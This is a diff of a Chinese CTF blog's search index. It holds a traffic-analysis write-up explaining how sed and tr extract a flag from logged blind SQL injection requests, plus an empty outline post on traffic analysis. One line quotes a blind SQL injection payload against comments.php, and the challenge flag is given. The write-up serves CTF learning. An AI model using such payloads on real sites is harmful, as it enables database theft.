+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1/comments.php?name=if((substr((select(text)from(wfy_comments)where(id=100)),1,1)=%22f%22),100,0)</span><br></pre></td></tr></table></figure></div>
+
+<p>来解释一下sed，s/和/中间的是正则表达式，执行替换功能，s/…/…/g的第一个…是正则的位置，第二个…是替换结果，//g是把符合正则的东西替换成空</p>
+<ol>
+<li><code>sed &#39;s/^.*)),//g&#39;</code>后：</li>
+</ol>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">1,1)=%22f%22),100,0)</span><br></pre></td></tr></table></figure></div>
+
+<ol start="2">
+<li><code>sed &#39;s/^.*=%22//g&#39; </code>后：</li>
+</ol>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">f%22),100,0)</span><br></pre></td></tr></table></figure></div>
+
+<ol start="3">
+<li><code>sed &#39;s/%22.*$//g&#39;</code>后：</li>
+</ol>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">f</span><br></pre></td></tr></table></figure></div>
+
+<ol start="4">
+<li><code>tr -d &#39;\n&#39;</code>删除换行符</li>
+</ol>
+<ul>
+<li>最终得到flag:<code>flag&#123;c84bb04a-8663-4ee2-9449-349f1ee83e11&#125; </code>，<code>%7B</code>和<code>%7D</code>分别是url编码里的<code>&#123;</code>和<code>&#125;</code></li>
+</ul>
+<p><img lazyload src="/images/loading.svg" data-src="./image-20240312225854294.png" alt="image-20240312225854294"></p>
 <h4 id="0x03-流量分析"><a href="#0x03-流量分析" class="headerlink" title="0x03 流量分析"></a>0x03 流量分析</h4><ul>
 <li>题目hint</li>
 </ul>
@@ -795,6 +924,17 @@
 <h1 id="CTF-MISC-流量分析总结"><a href="#CTF-MISC-流量分析总结" class="headerlink" title="CTF MISC 流量分析总结"></a>CTF MISC 流量分析总结</h1>]]></content>
       <categories>
         <category>CTF做题记录</category>
+      </categories>
+      <tags>
+        <tag>MISC-流量分析</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>CTF_MISC流量分析总结</title>
+    <url>/2024/03/12/MISC-%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90%E6%80%BB%E7%BB%93/</url>
+    <content><![CDATA[<h2 id="Wireshark-工具使用"><a href="#Wireshark-工具使用" class="headerlink" title="Wireshark 工具使用"></a>Wireshark 工具使用</h2><h2 id="USB流量"><a href="#USB流量" class="headerlink" title="USB流量"></a>USB流量</h2><h2 id="TLS流量"><a href="#TLS流量" class="headerlink" title="TLS流量"></a>TLS流量</h2><h2 id="webshell流量"><a href="#webshell流量" class="headerlink" title="webshell流量"></a>webshell流量</h2><h2 id="sql注入流量"><a href="#sql注入流量" class="headerlink" title="sql注入流量"></a>sql注入流量</h2>]]></content>
+      <categories>
+        <category>CTF知识积累</category>
       </categories>
       <tags>
         <tag>MISC-流量分析</tag>
